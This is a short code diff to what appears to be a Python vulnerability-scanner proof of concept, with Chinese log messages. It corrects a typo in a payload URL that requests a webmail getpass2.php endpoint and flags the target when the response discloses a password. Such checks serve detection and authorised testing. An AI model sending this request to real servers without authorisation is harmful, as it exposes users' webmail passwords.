@@ -33,10 +33,9 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            payload = "/webmail/getpass2.php?email=1@qq .com&update=2"
+            payload = "/webmail/getpass2.php?email=1@qq.com&update=2"
             url = arg + payload
             code, head,res, errcode, _ = hh.http(url)
-                       
             if code == 200 and "Your password is" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
